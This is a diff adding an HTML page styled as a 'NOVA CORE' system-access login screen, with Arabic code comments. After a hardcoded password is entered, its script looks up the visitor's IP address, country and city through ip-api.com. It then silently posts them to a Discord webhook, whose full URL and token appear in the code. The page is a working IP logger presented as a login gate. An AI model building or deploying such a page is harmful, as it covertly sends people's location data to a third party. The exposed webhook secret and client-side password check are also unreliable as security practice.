@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>NOVA CORE</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { border: 1px solid #0f0; padding: 30px; width: 400px; text-align: center; box-shadow: 0 0 15px #0f0; }
+        input { background: #000; border: 1px solid #0f0; color: #0f0; width: 90%; padding: 10px; margin: 10px 0; text-align: center; }
+        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; width: 100%; }
+    </style>
+</head>
+<body>
+
+<div class="box" id="loginBox">
+    <h3>SYSTEM ACCESS</h3>
+    <input type="password" id="pass" placeholder="ENTER KEY">
+    <button onclick="check()">LOGIN</button>
+</div>
+
+<div class="box" id="mainApp" style="display:none;">
+    <h3>CORE ENGAGED</h3>
+    <p id="info">Fetching Data...</p>
+</div>
+
+<script id="ipScript"></script>
+
+<script>
+    const myPassword = "Nova the best";
+    const webhookUrl = "https://discord.com/api/webhooks/1519167740273754165/PG851hxcowlrFxrEXBvXl6d1B07bVSpgijWgV-Ax7-f3cBkXjMnawT6u21DxXBRld988";
+
+    function check() {
+        if(document.getElementById('pass').value === myPassword) {
+            document.getElementById('loginBox').style.display = 'none';
+            document.getElementById('mainApp').style.display = 'block';
+            
+            // طلب البيانات من ip-api بطريقة الـ Callback
+            document.getElementById('ipScript').src = "https://ip-api.com/json/?callback=processData";
+        } else {
+            alert("WRONG KEY");
+        }
+    }
+
+    // هذه الدالة ستستقبل البيانات تلقائياً بعد تحميل السكريبت
+    window.processData = async function(data) {
+        if(data.status === 'success') {
+            const info = `IP: ${data.query} | ${data.country} | ${data.city}`;
+            document.getElementById("info").innerText = info;
+            
+            // إرسال للديسكورد
+            await fetch(webhookUrl, {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: "🚨 NOVA DATA: " + info })
+            });
+        } else {
+            document.getElementById("info").innerText = "Could not fetch location data.";
+        }
+    }
+</script>
+</body>
+</html>
